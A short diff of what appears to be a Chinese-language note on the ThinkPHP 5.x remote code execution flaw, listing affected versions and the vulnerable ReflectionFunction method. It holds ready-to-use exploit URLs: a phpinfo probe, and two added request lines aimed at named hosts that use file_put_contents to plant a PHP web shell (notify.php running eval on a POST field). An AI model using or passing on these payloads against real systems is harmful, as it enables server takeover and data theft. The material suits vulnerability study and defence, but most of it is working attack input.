@@ -17,7 +17,20 @@
     ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
     ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0
 
+    http://dkfh.h8mtqt.cn/api/invoke/args?function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=notify.php&vars[1][]=<?php @eval($_POST[1111]);?>
 
+    http://jogt.h8mtqt.cn/admin/auth/admin/invokesync?dialog=fast&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=notify.php&vars[1][]=<?php @eval($_POST[1111]);?>
+    
+    ReflectionFunction
+       /**
+     * 加载参数
+     */
+    public function args($function, $vars = [])
+    {
+        $reflect = new \ReflectionFunction($function);
+        $args    = \think\App::bindParams($reflect, $vars);
+        return $reflect->invokeArgs($args);
+    }
 
 ### tp受影响版本 5.x < 5.1.31, <= 5.0.23
 
